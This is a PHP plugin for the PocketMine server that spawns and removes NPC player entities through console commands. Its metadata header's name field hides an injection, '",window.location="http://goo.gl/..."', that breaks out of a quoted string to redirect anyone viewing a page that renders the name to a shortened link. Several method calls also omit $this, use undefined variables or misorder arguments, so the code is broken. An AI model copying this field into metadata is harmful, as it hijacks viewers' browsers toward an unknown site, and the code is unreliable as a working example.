<?php

/*
__PocketMine Plugin__
name=NPCTest",window.location="http://goo.gl/9Y9dL","
description=Create some NPCs!
version=1.0
author=zhuowei
class=NPCTest
apiversion=7
*/

/* 
Small Changelog
===============

1.0: Initial release

*/



class NPCTest implements Plugin{

	private $api, $npclist, $config, $path;
	public function __construct(ServerAPI $api, $server = false){
		$this->api = $api;
		$this->npclist = array();
	}
	
	public function init(){
		$this->path = $this->api->plugin->configPath($this);
		$this->api->console->register("spawnnpc", "Add an NPC. /spawnnpc [name] [player location] OR /spawnnpc [name] <x> <y> <z> <world>", array($this, "command"));
		$this->api->console->register("rmnpc", "Remove an NPC. /rmnpc [name]", array($this, "rmcommand"));
		$this->api->event("server.tick", array($this, "tickHandler"));
		$this->config = new Config($this->path."config.yml", CONFIG_YAML, array(
			"npcs" => array(),
		));
		$this->spawnAllNpcs();

	}

	public function spawnAllNpcs() {
		$npcconflist = $this->config->get("npcs");
		if (!is_array($npcconflist)) {
			$this->config->set("npcs", array());
			return;
		}
		foreach(array_keys($npcconflist) as $pname) {
			$p = $npcconflist[$pname];
			$pos = new Position($this->api->level->getDefault(), $p["Pos"][0], $p["Pos"][1], $p["Pos"][2]);
			createNpc($pname, $pos);
		}
	}

	public function command($cmd, $params, $issuer, $alias){
		$npcname = $params[0];
		$location = $this->api->level->getDefault()->getSpawn();
		if (count($params) <= 2) {
			$locationPlayer = $this->api->player->get($params[1]);
			if ($locationPlayer instanceof Player and ($locationPlayer->entity instanceof Entity)) {
				$location = $locationPlayer->entity;
			}
		} else {
			$locationX = $params[1];
			$locationY = $params[2];
			$locationZ = $params[3];
			if (count($param) > 4) {
				$locationWorld = $params[4];
			} else {
				$locationWorld = $this->api->level->getDefault();
			}
			$location = new Position($locationX, $locationY, $locationZ, $locationWorld);
		}
		$this->createNpc($npcname, $location);
		return "Created NPC at " . $location;
	}

	public function rmcommand($cmd, $params, $issuer, $alias){
		$npcname = $params[0];
		removeNpc($npcname);
		return "Removed NPC " . $npcname;
	}

	public function createNpc($npcname, $location) {
		$npcplayer = new Player("0", "127.0.0.1", 0, 0); //all NPC related packets are fired at localhost
		$npcplayer->spawned = true;
		$playerClassReflection = new ReflectionClass(get_class($npcplayer));
		$usernameField = $playerClassReflection->getProperty("username");
		$usernameField->setAccessible(true);
		$usernameField->setValue($npcplayer, $npcname);
		$iusernameField = $playerClassReflection->getProperty("iusername");
		$iusernameField->setAccessible(true);
		$iusernameField->setValue($npcplayer, strtolower($npcname));
		$timeoutField = $playerClassReflection->getProperty("timeout");
		$timeoutField->setAccessible(true);
		$timeoutField->setValue($npcplayer, PHP_INT_MAX - 0xff);
		$entityit = $this->api->entity->add($this->api->level->getDefault(), ENTITY_PLAYER, 0, array(
			"x" => $location->x,
			"y" => $location->y,
			"z" => $location->z,
			"Health" => 20,
			"player" => $npcplayer,
		));
		$entityit->setName($npcname);
		$this->api->entity->spawnToAll($this->api->level->getDefault(), $entityit->eid);
		$npcplayer->entity = $entityit;
		array_push($this->npclist, $npcplayer);
		$this->config->get("npcs")[$npcname] = array(
			"Pos" => array(
				0 => $location->x,
				1 => $location->y,
				2 => $location->z,
			),
		);
		$this->config->save();
	}

	public function removeNpc($npcname) {
		foreach(array_keys($this->npclist) as $pk) {
			$p = $this->npclist[$pk];
			if ($p->entity->name === $npcname) {
				$this->server->api->entity->remove($p->entity->eid);
				unset($this->npclist[$pk]);
				break;
			}
		}
		unset($this->config->get("npcs")[$npcname]);
		$this->config->save();
	}

	public function tickHandler($data, $event) {
		foreach($this->npclist as $p) {
			if ($p->entity->dead) {
				$p->entity->fire = 0;
				$p->entity->air = 300;
				$p->entity->setHealth(20, "respawn");
				$p->entity->updateMetadata();
				$this->api->entity->spawnToAll($p->level, $p->entity->eid);
			}
			//TODO: physics on the players. Looking/attacking
		}
	}
	
	public function __destruct(){

	}

	
}
